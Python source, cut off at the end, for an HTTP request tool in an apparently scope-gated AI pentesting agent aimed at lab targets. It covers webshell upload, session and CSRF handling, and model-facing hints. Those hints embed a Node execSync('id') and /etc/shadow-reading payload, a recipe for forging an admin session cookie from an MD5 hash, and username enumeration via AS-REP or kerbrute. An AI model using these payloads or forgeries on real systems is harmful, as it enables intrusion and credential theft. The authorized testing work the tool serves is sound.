"""Durable ``nexus.web.request`` handler: one scoped HTTP request.

This is the missing manual primitive between *recon* and *post-exploitation*:
the classic web chain is ``gobuster -> find upload panel -> upload a webshell ->
trigger it with a query parameter``. Before this tool the motor could discover
``/panel/`` and ``/uploads/`` but had no governed way to *send* the exploit or
to *drive* the shell afterwards (B-ROOTME-1 of ``RUN_sala02``).

The handler never talks to the network itself: it runs a tiny stdlib
``urllib`` client through ``sandbox_for_environment`` (``python3`` is already in
the recon program allowlist), so execution stays inside the same contract as the
rest of the durable tools. It supports:

* arbitrary method (``GET``/``POST``/``PUT``/``OPTIONS``/``HEAD``/``DELETE``);
* custom headers;
* a raw text or base64 body;
* a **multipart file upload** whose file must live inside the engagement
  workspace (same confinement as ``nexus.workspace.read``).

The response body is returned as a bounded preview plus its sha256, so a
webshell command output travels back in the same observation without shipping
unbounded bytes into the agent context. The tool is read-mostly but can carry an
exploit, so the noise/risk is MEDIUM and every call still passes the signed
scope, policy, approval and audit gate.
"""

from __future__ import annotations

import base64
import json
import os
import re
import tempfile
from pathlib import Path
from collections.abc import Mapping
from typing import Any
from urllib.parse import urlsplit

from nexus_core.kernel.fact_verification import access_denied_page, authenticated_page_signal
from nexus_core.kernel.html_evidence import extract_page_evidence, next_pages
from nexus_core.kernel.identity_derivation import derive_identities
from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.redaction import redact_result, secrets_for_redaction
from nexus_core.kernel.sandbox import sandbox_for_environment

from ._exec import RECON_ALLOWED_PROGRAMS, run_in_sandbox
from .workspace import resolve_workspace_path, workspace_root

HTTP_ALLOWED_PROGRAMS = RECON_ALLOWED_PROGRAMS
HTTP_DEFAULT_TIMEOUT_SECONDS = 30
HTTP_MAX_TIMEOUT_SECONDS = 300

#: Response bytes carried back in the observation (before the sha256 pass).
HTTP_DEFAULT_MAX_RESPONSE_BYTES = 65_536
HTTP_MAX_RESPONSE_BYTES = 1_000_000

#: Bounds on the extracted lists inside one observation. The extractor caps at
#: 50; the model needs the leads, not the sitemap.
HTTP_MAX_LISTED_ITEMS = 10
#: Linked pages the observation names as next steps.
HTTP_MAX_NEXT_PAGES = 5

#: Methods the operator may invoke. ``DELETE`` is included because it is a
#: legitimate part of some web chains, but it is not destructive at the file
#: level beyond what the target already exposes.
HTTP_ALLOWED_METHODS = ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS")

#: Cap on custom headers (argv transport + header-injection surface).
HTTP_MAX_HEADERS = 20
HTTP_MAX_HEADER_VALUE = 4096
#: Cap on the ``Cookie`` header this call may send (one line, no CRLF).
HTTP_MAX_COOKIE_CHARS = 4096
#: Cap on extra multipart form fields sent alongside a file upload.
HTTP_MAX_FORM_FIELDS = 20
#: Cap on the raw text body carried through argv.
HTTP_MAX_DATA_CHARS = 262_144
HTTP_MAX_DATA_B64_CHARS = 524_288

#: Path marker of the Node preview endpoint measured in DeadDrop P12
#: (2026-10-22): an executed module answers with its ``module.exports``, so an
#: empty export serializes to exactly ``{}``. The model read that as "the file
#: is served as plain text", recorded a ``barrier`` and spent thirty turns on a
#: vector that had already worked. The note below travels with the observation
#: so the ambiguity is resolved where it is created.
HTTP_PREVIEW_PATH_MARKER = "/preview/"
HTTP_PREVIEW_EMPTY_MODULE_BODY = "{}"
HTTP_PREVIEW_MODULE_NOTE = (
    "El módulo Node.js de /preview SE EJECUTÓ y su `module.exports` estaba "
    "vacío: `{}` es la respuesta correcta, NO significa que el fichero se "
    "sirva como texto plano. `require('child_process').exec(...)` es "
    "asíncrono y no devuelve salida; para capturarla reescribe el .js con "
    "`module.exports = require('child_process').execSync('id').toString()` "
    "(o `require('fs').readFileSync('/etc/shadow').toString()`), vuelve a "
    "subirlo y repite la petición. No registres un barrier por este `{}`."
)


def _page_evidence(payload: dict[str, Any], url: str) -> dict[str, Any] | None:
    """Extract identity and surface from an HTML response, or ``None``.

    Measured (HackPark V15 family): the footer carried ``j.doe@services.local``
    and the team page listed the staff with their roles, and the engine recorded
    nothing because no HTTP-path tool ever read an address, a person or a link.
    This is the deterministic half of that fix -the verifier turns the result
    into ``email``/``user`` facts, the handler only reports the observation.

    Only markup is mined: a JSON API or a binary download costs one content-type
    check and returns ``None``.
    """
    content_type = str(payload.get("content_type") or "").lower()
    body = payload.get("body_preview")
    if not isinstance(body, str) or not body.strip():
        return None
    looks_like_html = "html" in content_type or body.lstrip().startswith("<")
    if not looks_like_html:
        return None
    extracted = extract_page_evidence(body, url)
    identities = derive_identities(
        extracted.get("emails") or (),
        extracted.get("people") or (),
        max_candidates=HTTP_MAX_LISTED_ITEMS,
    )
    extracted["emails"] = extracted["emails"][:HTTP_MAX_LISTED_ITEMS]
    extracted["people"] = extracted["people"][:HTTP_MAX_LISTED_ITEMS]
    extracted["links"] = extracted["links"][:HTTP_MAX_LISTED_ITEMS]
    extracted["technologies"] = extracted["technologies"][:HTTP_MAX_LISTED_ITEMS]
    extracted["identities"] = identities
    return extracted


def _identity_next_steps(extracted: dict[str, Any], url: str) -> list[str]:
    """Name the pages and accounts the response just handed over.

    The observation is the instruction: a run that does not notice ``about.html``
    in the nav is not helped by a better prompt, it is helped by the tool saying
    which URLs are one hop away and which three accounts are worth validating
    first. Validating existence is explicitly cheaper than spending a password.
    """
    steps: list[str] = []
    pages = next_pages(extracted, url, limit=HTTP_MAX_NEXT_PAGES)
    if pages:
        steps.append(
            "rutas enlazadas sin visitar (pídelas con nexus.web.request): "
            + ", ".join(pages)
        )
    identities = extracted.get("identities") or {}
    candidates = [
        item for item in identities.get("candidates") or ()
        if isinstance(item, dict) and item.get("basis") != "observed_email"
    ]
    if candidates:
        top = ", ".join(
            f"{item.get('username')} ({item.get('confidence')}"
            + (f", {item['title']}" if item.get("title") else "")
            + ")"
            for item in candidates[:3]
        )
        steps.append(
            "identidades derivadas: " + top
            + "; confirma cuáles existen (AS-REP / kerbrute o una sonda de login "
              "que no consuma intento) antes de probar contraseñas"
        )
    return steps


def _preview_module_annotation(url: str, payload: dict[str, Any]) -> dict[str, Any]:
    """Mark an empty ``module.exports`` as *execution*, not as plain text.

    Only the exact shape measured on the target is annotated: a ``/preview/``
    path whose body is ``{}`` after stripping whitespace. An HTML body that
    contains the file is the *other* case -the server really is serving text-,
    so it is left untouched.
    """
    if HTTP_PREVIEW_PATH_MARKER not in urlsplit(str(url or "")).path:
        return {}
    body = payload.get("body_preview")
    if not isinstance(body, str) or body.strip() != HTTP_PREVIEW_EMPTY_MODULE_BODY:
        return {}
    return {
        "preview_executed": True,
        "preview_note": HTTP_PREVIEW_MODULE_NOTE,
    }

#: stdlib client executed inside the sandbox. argv layout (after ``-c``):
#: method url headers_json data_b64 upload_json follow max_bytes timeout save_path
#: insecure download_limit staging csrf csrf_form_url.
#: ``upload_json`` is ``null`` or ``{"field","filename","content_type","path"}``.
#: ``insecure`` (``1``/``0``) disables TLS certificate verification for exactly
#: one request; it is an explicit operator opt-in, never a default.
HTTP_CLIENT_SCRIPT = r"""
import base64, hashlib, json, os, ssl, sys, time, tempfile, urllib.error, urllib.parse, urllib.request, uuid


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    allow_same_origin = False
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        # Returning None tells urllib to hand back the original 3xx response
        # instead of chasing the redirect (keeps the forensic status code).
        if self.allow_same_origin:
            old, new = urllib.parse.urlsplit(req.full_url), urllib.parse.urlsplit(newurl)
            if (old.scheme, old.hostname, old.port) == (new.scheme, new.hostname, new.port):
                return super().redirect_request(req, fp, code, msg, headers, newurl)
        return None


def _get_all(headers, name):
    # Every value of a repeated header (Set-Cookie cannot be joined).
    if headers is None:
        return []
    getter = getattr(headers, "get_all", None)
    if getter is not None:
        try:
            return [str(value) for value in (getter(name) or [])]
        except Exception:
            return []
    return [str(value) for key, value in headers.items() if key.lower() == name.lower()]


def _hidden_fields(page):
    # ASP.NET WebForms (and most CSRF defences) put the anti-forgery values in
    # hidden inputs: __VIEWSTATE, __EVENTVALIDATION, __VIEWSTATEGENERATOR,
    # __RequestVerificationToken, authenticity_token, _token... Collecting every
    # hidden input is both simpler and more complete than a name allowlist.
    from html.parser import HTMLParser

    class _Collect(HTMLParser):
        def __init__(self):
            super().__init__(convert_charrefs=True)
            self.fields = []
            self.action = None

        def handle_starttag(self, tag, attrs):
            values = {key.lower(): (value if value is not None else "") for key, value in attrs}
            name = values.get("name", "")
            if tag.lower() == "input" and name:
                if values.get("type", "").lower() == "hidden":
                    self.fields.append((name, values.get("value", "")))
            elif tag.lower() == "form" and self.action is None:
                self.action = values.get("action") or None

    collector = _Collect()
    collector.feed(page or "")
    return collector.fields, collector.action


def _csrf_prepare(url, headers, body, upload, timeout, form_url):
    # Fetch the form, merge its hidden fields into the body (or the multipart
    # fields) and carry the session cookie the GET set: without that cookie a
    # token issued for an anonymous session is rejected by the panel.
    page_url = form_url or url
    get_headers = {
        key: value for key, value in headers.items()
        if key.lower() not in {"content-type", "content-length"}
    }
    redirect = _NoRedirect()
    redirect.allow_same_origin = True
    opener = urllib.request.build_opener(redirect)
    request = urllib.request.Request(page_url, method="GET", headers=get_headers)
    try:
        with opener.open(request, timeout=timeout) as response:
            status = response.status
            page = response.read(1_000_000).decode("utf-8", "replace")
            set_cookie = _get_all(response.headers, "Set-Cookie")
            final_url = response.geturl()
    except urllib.error.HTTPError as exc:
        status = exc.code
        page = exc.read(1_000_000).decode("utf-8", "replace")
        set_cookie = _get_all(exc.headers, "Set-Cookie")
        final_url = exc.geturl() if hasattr(exc, "geturl") else page_url
        exc.close()

    fields, action = _hidden_fields(page)
    cookies = []
    for raw in set_cookie:
        first = str(raw).split(";", 1)[0].strip()
        if "=" in first and first not in cookies:
            cookies.append(first)
    cookie_sent = headers.get("Cookie") or headers.get("cookie") or ""
    if cookie_sent:
        cookies.append(cookie_sent)
    if cookies:
        merged = "; ".join(cookies)
        headers = {key: value for key, value in headers.items() if key.lower() != "cookie"}
        headers["Cookie"] = merged

    if upload:
        existing = upload.setdefault("fields", {})
        for name, value in fields:
            existing.setdefault(name, value)
    else:
        content_type = headers.get("Content-Type") or headers.get("content-type") or ""
        if body and content_type and "application/x-www-form-urlencoded" not in content_type:
            raise ValueError("csrf_mode requires an urlencoded form body")
        pairs = urllib.parse.parse_qsl(
            (body or b"").decode("utf-8", "replace"), keep_blank_values=True
        )
        present = {name for name, _ in pairs}
        pairs.extend((name, value) for name, value in fields if name not in present)
        body = urllib.parse.urlencode(pairs).encode("utf-8")
        headers = {key: value for key, value in headers.items() if key.lower() != "content-length"}
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    return body, headers, {
        "form_url": final_url or page_url,
        "form_action": action,
        "status": status,
        "fields": [name for name, _ in fields],
        "field_count": len(fields),
        "cookie_names": [value.split("=", 1)[0] for value in cookies if "=" in value],
    }


def _build_upload(upload):
    boundary = "----OmniBoundary" + uuid.uuid4().hex
    field = upload["field"]
    filename = upload.get("filename") or "upload.bin"
    content_type = upload.get("content_type") or "application/octet-stream"
    size = os.path.getsize(upload["path"])
    if size > 268435456:
        raise ValueError("upload exceeds 256 MiB")
    crlf = "\r\n"
    parts = []
    # Plain form fields first (a panel often validates $_POST["submit"] before
    # it moves the file), then the file part, then the closing boundary.
    for name, value in (upload.get("fields") or {}).items():
        parts.append(
            ("--" + boundary + crlf
             + 'Content-Disposition: form-data; name="' + name + '"' + crlf + crlf
             + str(value) + crlf).encode("utf-8")
        )
    parts.append(
        ("--" + boundary + crlf
         + 'Content-Disposition: form-data; name="' + field + '"; filename="'
         + filename + '"' + crlf
         + "Content-Type: " + content_type + crlf + crlf).encode("utf-8")
    )
    prefix = b"".join(parts)
    suffix = (crlf + "--" + boundary + "--" + crlf).encode("utf-8")
    raw_mode = upload.get("mode") == "raw"
    if raw_mode:
        prefix, suffix = b"", b""
    def chunks():
        yield prefix
        with open(upload["path"], "rb") as handle:
            remaining = size
            while remaining:
                chunk = handle.read(min(65536, remaining))
                if not chunk:
                    raise OSError("upload source changed")
                remaining -= len(chunk)
                yield chunk
        yield suffix
    return (content_type if raw_mode else "multipart/form-data; boundary=" + boundary,
            chunks(), size, len(prefix) + size + len(suffix))


def main():
    (method, url, headers_json, data_b64, upload_json, follow, max_bytes, timeout,
     save_path, insecure) = sys.argv[1:11]
    method = method.upper()
    headers = json.loads(headers_json or "{}")
    follow = follow == "1"
    insecure = insecure == "1"
    max_bytes = max(1, int(max_bytes))
    timeout = float(timeout)
    body = base64.b64decode(data_b64) if data_b64 else None
    uploaded = None
    upload = json.loads(upload_json) if upload_json and upload_json != "null" else None
    # ``csrf_mode`` (sys.argv[13]) and the optional form URL (sys.argv[14]):
    # ASP.NET WebForms rejects a POST without the __VIEWSTATE/__EVENTVALIDATION
    # tokens of the page it rendered, and Hydra/manual requests cannot ask for
    # them. ``sys.argv[0]`` is ``-c``, so the script sees ``handler_argv - 2``.
    csrf = None
    csrf_mode = len(sys.argv) > 13 and sys.argv[13] == "1"
    csrf_form_url = sys.argv[14] if len(sys.argv) > 14 else ""
    if csrf_mode:
        try:
            body, headers, csrf = _csrf_prepare(
                url, headers, body, upload, timeout, csrf_form_url
            )
        except Exception as exc:
            print(json.dumps({
                "ok": False,
                "url": url,
                "method": method,
                "error": "csrf_form_fetch_failed: %s: %s" % (type(exc).__name__, exc),
            }))
            return
    if upload:
        content_type, body, size, wire_size = _build_upload(upload)
        headers = {k: v for k, v in headers.items() if k.lower() not in {"content-length", "transfer-encoding"}}
        headers["Content-Length"] = str(wire_size)
        headers["Content-Type"] = content_type
        uploaded = {
            "field": upload["field"],
            "filename": upload.get("filename"),
            "content_type": upload.get("content_type"),
            "size": size,
        }
        if method in ("GET", "HEAD"):
            method = "POST"

    request = urllib.request.Request(url, data=body, method=method, headers=headers)
    # The default context verifies certificates (fail-closed). ``insecure`` only
    # swaps in an unverified context when the operator asked for it on this call,
    # which is what a lab target with a self-signed cert requires.
    redirect = _NoRedirect()
    redirect.allow_same_origin = follow
    handlers = [redirect]
    if insecure:
        handlers.append(
            urllib.request.HTTPSHandler(context=ssl._create_unverified_context())
        )
    opener = urllib.request.build_opener(*handlers)
    started = time.time()
    status = None
    reason = ""
    response_headers = {}
    # ``headers`` keeps the last value per name (a plain dict), which silently
    # drops repeated headers. ``Set-Cookie`` is the one that matters: a login
    # response carries JSESSIONID *and* csrf, and a session-carrying chain needs
    # both. Preserve every value in ``set_cookie`` so multi-step flows work.
    set_cookie = []
    raw = b""
    saved = None
    body_bytes = 0
    digest = hashlib.sha256()
    download_limit = int(sys.argv[11]) if len(sys.argv) > 11 else 268435456
    complete = False
    def drain(response):
        nonlocal raw, saved, body_bytes, complete
        temporary = None
        handle = None
        try:
            if save_path:
                parent = os.path.dirname(save_path)
                os.makedirs(parent, exist_ok=True)
                staging = sys.argv[12] if len(sys.argv) > 12 else parent
                fd, temporary = tempfile.mkstemp(prefix=".http-", dir=staging)
                handle = os.fdopen(fd, "wb")
            limit = download_limit if save_path else max_bytes
            while body_bytes <= limit:
                chunk = response.read(min(65536, limit + 1 - body_bytes))
                if not chunk:
                    complete = True
                    break
                body_bytes += len(chunk)
                digest.update(chunk)
                raw += chunk[:max(0, max_bytes - len(raw))]
                if body_bytes > limit:
                    break
                if handle:
                    handle.write(chunk)
            expected = response.headers.get("Content-Length") or response.headers.get("content-length")
            if complete and method != "HEAD" and expected is not None:
                complete = expected.isdigit() and body_bytes == int(expected)
            if handle:
                handle.flush()
                os.fsync(handle.fileno())
                handle.close()
                handle = None
                if complete:
                    os.replace(temporary, save_path)
                    temporary = None
                    saved = {"path": save_path, "bytes": body_bytes,
                             "sha256": digest.hexdigest(), "complete": True}
                else:
                    saved = {"error": "download_limit_exceeded" if body_bytes > limit else "incomplete_response", "complete": False}
        finally:
            if handle:
                handle.close()
            if temporary:
                os.unlink(temporary)
    try:
        with opener.open(request, timeout=timeout) as response:
            status = response.status
            reason = response.reason or ""
            response_headers = {k.lower(): v for k, v in response.headers.items()}
            set_cookie = _get_all(response.headers, "Set-Cookie")
            drain(response)
    except urllib.error.HTTPError as exc:
        status = exc.code
        reason = getattr(exc, "reason", "") or ""
        try:
            response_headers = {k.lower(): v for k, v in (exc.headers.items() if exc.headers else [])}
            set_cookie = _get_all(exc.headers, "Set-Cookie")
        except Exception:
            response_headers = {}
        try:
            drain(exc)
        finally:
            exc.close()
    except Exception as exc:
        print(json.dumps({
            "ok": False,
            "url": url,
            "method": method,
            "error": "%s: %s" % (type(exc).__name__, exc),
        }))
        return

    elapsed_ms = int((time.time() - started) * 1000)
    truncated = body_bytes > max_bytes
    preview_bytes = raw
    print(json.dumps({
        "ok": not save_path or complete,
        "body_complete": complete,
        "error": (saved or {}).get("error"),
        "url": url,
        "method": method,
        "status": status,
        "reason": reason,
        "headers": response_headers,
        "set_cookie": set_cookie,
        "content_type": response_headers.get("content-type"),
        "content_length_header": response_headers.get("content-length"),
        "body_bytes": body_bytes,
        "body_sha256": digest.hexdigest(),
        "body_preview": preview_bytes.decode("utf-8", "replace"),
        "preview_truncated": truncated,
        "elapsed_ms": elapsed_ms,
        "uploaded": uploaded,
        "saved": saved,
        "csrf": csrf,
    }))


main()
"""


def http_request_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.web.request``."""
    return ToolDefinition(
        tool_id="nexus.web.request",
        effect="target_write",
        name="Scoped HTTP request",
        tenant_id=tenant_id,
        description=(
            "Envía UNA petición HTTP(S) a un target dentro del scope: método, "
            "cabeceras, body y subida de archivo multipart (desde el workspace). "
            "Devuelve status, cabeceras y un preview acotado del body con sha256. "
            "Es el primitivo manual para subir un webshell y accionarlo (p. ej. "
            "GET /uploads/shell.phtml?cmd=id). Pasa por scope, policy y audit."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 3, "maxLength": 2048},
                "method": {"type": "string", "enum": list(HTTP_ALLOWED_METHODS)},
                "headers": {
                    "type": "object",
                    "maxProperties": HTTP_MAX_HEADERS,
                    "additionalProperties": {"type": "string", "maxLength": HTTP_MAX_HEADER_VALUE},
                },
                # A session cookie is the one thing a form login leaves behind,
                # and without it the request is anonymous: Brute It v7 had the
                # validated ``admin`` credential and every panel request still
                # came back unauthenticated (iteration 22).
                "cookie": {
                    "type": "string",
                    "maxLength": HTTP_MAX_COOKIE_CHARS,
                    "description": (
                        "Valor literal de la cabecera Cookie (p. ej. "
                        "'PHPSESSID=abc; csrf=def'). Prefiere `session_ref` si la "
                        "sesión la abrió el motor."
                    ),
                },
                "session_ref": {
                    "type": "string",
                    "pattern": "^vault:[a-f0-9]{32}$",
                    "description": (
                        "Handle de una sesión guardada en el vault. Lo devuelve "
                        "nexus.cred.bruteforce al validar un login de formulario, "
                        "y también esta misma tool en `session_ref` cuando la "
                        "respuesta trae Set-Cookie: manda ese handle en la "
                        "siguiente petición en vez de copiar la cookie. El motor "
                        "lo resuelve y envía la cabecera Cookie; el valor no "
                        "entra en el contexto del modelo."
                    ),
                },
                "data": {"type": "string", "maxLength": HTTP_MAX_DATA_CHARS},
                "data_base64": {"type": "string", "maxLength": HTTP_MAX_DATA_B64_CHARS},
                "upload": {
                    "type": "object",
                    "properties": {
                        "mode": {"type": "string", "enum": ["multipart", "raw"]},
                        "field": {"type": "string", "minLength": 1, "maxLength": 128},
                        "filename": {"type": "string", "maxLength": 255},
                        "content_type": {"type": "string", "maxLength": 128},
                        "path": {"type": "string", "minLength": 1, "maxLength": 4096},
                        "fields": {
                            "type": "object",
                            "maxProperties": HTTP_MAX_FORM_FIELDS,
                            "additionalProperties": {"type": "string", "maxLength": HTTP_MAX_HEADER_VALUE},
                        },
                    },
                    "required": ["field", "path"],
                    "additionalProperties": False,
                },
                "follow_redirects": {"type": "boolean"},
                "insecure": {
                    "type": "boolean",
                    "description": (
                        "Desactiva la verificación del certificado TLS SOLO para esta "
                        "petición (objetivos con certificado autofirmado o que no "
                        "coincide con el host). Por defecto false y queda en evidencia."
                    ),
                },
                "csrf_mode": {
                    "type": "boolean",
                    "description": (
                        "Para formularios con token anti-CSRF (ASP.NET WebForms, "
                        "Django, Rails, Joomla): hace primero un GET a la página, "
                        "extrae TODOS los <input type=hidden> (__VIEWSTATE, "
                        "__EVENTVALIDATION, __RequestVerificationToken, _token...) "
                        "y los inyecta en el POST junto con tu `data`, reutilizando "
                        "la cookie de sesión que dejó el GET. Imprescindible cuando "
                        "el panel rechaza el login sin esos tokens."
                    ),
                },
                "csrf_form_url": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": 2048,
                    "description": (
                        "URL del formulario para el GET de `csrf_mode` cuando no "
                        "coincide con `url` (p. ej. la action absoluta del form). "
                        "Por defecto se usa `url`."
                    ),
                },
                "save_path": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 4096,
                    "description": (
                        "Ruta RELATIVA dentro del workspace donde guardar el cuerpo "
                        "crudo de la respuesta (útil para binarios: objetos git, "
                        "jarfiles). Evita exponer bytes no imprimibles en el contexto."
                    ),
                },
                "max_download_bytes": {"type": "integer", "minimum": 1, "maximum": 268435456},
                "max_response_bytes": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": HTTP_MAX_RESPONSE_BYTES,
                },
                "timeout_seconds": {"type": "integer", "minimum": 5, "maximum": HTTP_MAX_TIMEOUT_SECONDS},
            },
            "required": ["url"],
            "additionalProperties": False,
        },
        risk=RiskLevel.MEDIUM,
        required_permissions=["execute:tool:nexus.web.request"],
        timeout_seconds=300,
        max_output_bytes=2_000_000,
        scope_target_field="url",
        scope_required=True,
    )


def _validate_url(value: Any) -> str:
    """Return a normalized ``http(s)`` URL or raise ``ValueError``."""
    text = str(value or "").strip()
    if not text:
        raise ValueError("url is required")
    parts = urlsplit(text)
    if parts.scheme not in {"http", "https"}:
        raise ValueError(f"url scheme must be http or https: {text!r}")
    if not parts.netloc:
        raise ValueError(f"url has no host: {text!r}")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
        raise ValueError("url contains control characters")
    return text


def _validate_headers(value: Any) -> dict[str, str]:
    """Return a header mapping with control-character-free keys and values."""
    if value in (None, ""):
        return {}
    if not isinstance(value, dict):
        raise ValueError("headers must be an object")
    if len(value) > HTTP_MAX_HEADERS:
        raise ValueError(f"too many headers: {len(value)} > {HTTP_MAX_HEADERS}")
    cleaned: dict[str, str] = {}
    for key, raw in value.items():
        name = str(key).strip()
        if not name or ":" in name:
            raise ValueError(f"invalid header name: {key!r}")
        text = str(raw)
        if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in name + text):
            raise ValueError(f"header {name!r} contains control characters")
        cleaned[name] = text
    return cleaned


def _sanitize_token(value: Any, field: str, *, max_length: int) -> str:
    """Return a stripped token free of quotes/control chars (header injection)."""
    text = str(value or "").strip()
    if not text:
        raise ValueError(f"{field} is required")
    if len(text) > max_length:
        raise ValueError(f"{field} is too long")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F or ch in '"\\' for ch in text):
        raise ValueError(f"{field} contains invalid characters")
    return text


def _build_upload_spec(value: Any, root: str) -> dict[str, Any]:
    """Validate the multipart upload object and confine its path to the workspace."""
    if not isinstance(value, dict):
        raise ValueError("upload must be an object")
    field = _sanitize_token(value.get("field"), "upload.field", max_length=128)
    filename = os.path.basename(str(value.get("filename") or "upload.bin"))
    filename = _sanitize_token(filename, "upload.filename", max_length=255)
    content_type = str(value.get("content_type") or "application/octet-stream").strip()
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in content_type):
        raise ValueError("upload.content_type contains control characters")
    path = resolve_workspace_path(str(value.get("path") or ""), root=root)
    raw_fields = value.get("fields") or {}
    if not isinstance(raw_fields, dict):
        raise ValueError("upload.fields must be an object")
    if len(raw_fields) > HTTP_MAX_FORM_FIELDS:
        raise ValueError(f"too many form fields: {len(raw_fields)} > {HTTP_MAX_FORM_FIELDS}")
    fields: dict[str, str] = {}
    for key, raw in raw_fields.items():
        name = _sanitize_token(key, "upload.fields name", max_length=128)
        text = str(raw)
        if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in text):
            raise ValueError(f"upload field {name!r} contains control characters")
        fields[name] = text
    return {
        "mode": str(value.get("mode", "multipart")),
        "field": field,
        "filename": filename,
        "content_type": content_type,
        "path": str(path),
        "fields": fields,
    }


def _resolve_save_path(value: Any, root: str) -> str:
    """Return an absolute workspace path for a download, or ``""`` when unset.

    The download target is confined to the engagement workspace exactly like the
    upload source: an absolute path or a ``..`` escape is refused, so this can
    never become an arbitrary file write.
    """
    text = str(value or "").strip()
    if not text:
        return ""
    if "\x00" in text:
        raise ValueError("save_path contains a NUL byte")
    if os.path.isabs(text):
        raise ValueError("save_path must be relative to the workspace")
    root_path = Path(root).resolve()
    candidate = (root_path / text).resolve()
    if candidate == root_path or root_path not in candidate.parents:
        raise ValueError("save_path must name a file inside the engagement workspace")
    return str(candidate)


def _parse_last_json(stdout: str) -> dict[str, Any]:
    """Return the last JSON object printed by the client, else raise ``ValueError``."""
    for line in reversed(stdout.splitlines()):
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            payload = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict):
            return dict(payload)
    raise ValueError("http client did not return a JSON result")


#: A session cookie that decodes to ``user:<32 hex>`` is a forgeable handle,
#: not an opaque id: the app is signing the session with the password hash.
#: Measured in Hijack (2026-10-30): ``PHPSESSID`` was
#: ``base64("admin:" + md5(password))``, and the run never noticed, so the
#: hashes it already had could not be turned into an admin session.
_SESSION_DECODED_RE = re.compile(
    r"^(?P<user>[A-Za-z0-9_.@\-]{1,64}):(?P<digest>[0-9a-fA-F]{32})$"
)


def _session_scheme(cookies: Mapping[str, str]) -> dict[str, Any] | None:
    """The forgeable scheme a response cookie reveals, or ``None``.

    Only whole-value base64 that decodes to ``user:32hex`` is reported: that is
    the exact shape of a ``base64(user:md5(password))`` session, and naming it
    turns "compare hashes by hand" into one deterministic command.
    """
    from ._loot import decode_base64_text

    for name, value in (cookies or {}).items():
        decoded = decode_base64_text(value)
        if not decoded:
            continue
        match = _SESSION_DECODED_RE.match(decoded.strip())
        if match is None:
            continue
        return {
            "cookie": name,
            "scheme": "base64(user:md5(password))",
            "decoded": decoded.strip(),
            "username": match.group("user"),
            "hash": match.group("digest"),
            "hash_kind": "md5",
        }
    return None


FORGEABLE_SESSION_HINT = (
    "El cookie de sesión es base64('<usuario>:md5(<contraseña>)'), no un id "
    "aleatorio: si tienes el hash o la contraseña puedes FORJAR la sesión de otro "
    "usuario sin pasar por el login. Calcula el valor con nexus.shell.exec: "
    "python3 -c \"import base64,hashlib;print(base64.b64encode(('admin:'+"
    "hashlib.md5(b'PASSWORD').hexdigest()).encode()).decode())\" y mándalo en "
    "nexus.web.request(cookie='PHPSESSID=<valor>'). Si el panel deja de responder "
    "'Access denied' o el formulario de login, la sesión es válida."
)


def _cookie_pairs(set_cookie: Any) -> dict[str, str]:
    """``{name: value}`` from raw ``Set-Cookie`` values (attributes dropped).

    ``set_cookie`` keeps the raw header -what a browser would store- while this
    mapping is the shape the model can paste into the next request without
    re-parsing ``Path``/``HttpOnly`` attributes.
    """
    cookies: dict[str, str] = {}
    for raw in set_cookie or ():
        first = str(raw).split(";", 1)[0].strip()
        name, separator, value = first.partition("=")
        if separator and name.strip():
            cookies[name.strip()] = value.strip()
    return cookies


def _store_session(
    cookies: dict[str, str],
    context: RunContext,
    current_ref: str,
    cookie_sent: str,
) -> str | None:
    """Store a session the response just issued and return its ``vault:`` handle.

    A manual login is the normal way in (DeadDrop 2026-10-22: ``admin'-- -``
    returned ``302`` with ``connect.sid``). Until now the only way to reuse that
    cookie was to paste it into ``cookie``, which puts a live session value in
    the model's context and loses it on restart. Storing it here closes the loop:
    the next call passes ``session_ref`` and the value never leaves the vault.

    Returns ``current_ref`` unchanged when the response issued nothing new, so a
    caller that already had a handle keeps it across the ``Set-Cookie`` refresh a
    real login performs.
    """
    if not cookies:
        return current_ref or None
    header = "; ".join(f"{name}={value}" for name, value in sorted(cookies.items()))
    if not header or header == cookie_sent.strip():
        return current_ref or None
    from nexus_core.kernel.secret_store import default_secret_store

    return default_secret_store().put(
        header, kind="session", tenant_id=context.tenant_id
    )


#: A page that still asks for a password is a login form, not the panel behind
#: it. Same detection the planner uses for the login probes.
_PASSWORD_INPUT_RE = re.compile(r"type\s*=\s*[\"']?password", re.IGNORECASE)

#: What the model reads when its ``session_ref`` did not authenticate.
SESSION_NOT_AUTHENTICATED_GUIDANCE = (
    "La sesión NO autentica: el servidor devolvió el formulario de login (200 con "
    "campo de contraseña) en lugar del panel. No sigas navegando con ese "
    "session_ref ni repitas la misma petición. Vuelve a hacer login con "
    "nexus.web.request (method=\"POST\" al form de login; csrf_mode=true si el "
    "formulario lleva tokens) y usa el session_ref que devuelva ese POST. Si el "
    "login sigue devolviendo el formulario, esa credencial no es de esta "
    "aplicación: cambia de vector en vez de insistir."
)


#: What the model reads when its session *did* open the page. The absence of
#: this verdict is what cost hijack_v5 27 turns (2026-10-29): it held a working
#: ``session_ref`` and kept re-trying the login because nothing told it it was in.
SESSION_AUTHENTICATED_GUIDANCE = (
    "La sesión autentica: la respuesta es la página de dentro (sin formulario de "
    "login, con 'logout' o en una ruta privada). El motor lo registra como hecho "
    "'access' y el plan pasa a la fase siguiente. NO repitas el login ni vuelvas a "
    "probar la misma credencial: enumera lo que el panel permite (subida de "
    "archivos, ejecución, usuarios, IDOR) para convertir el acceso en shell/flag."
)

#: The other half of the verdict: a 200 that denies the session. Silence here is
#: what made the run record a false ``barrier`` ("vector web auth agotado") over a
#: credential that hydra had just validated.
SESSION_DENIED_GUIDANCE = (
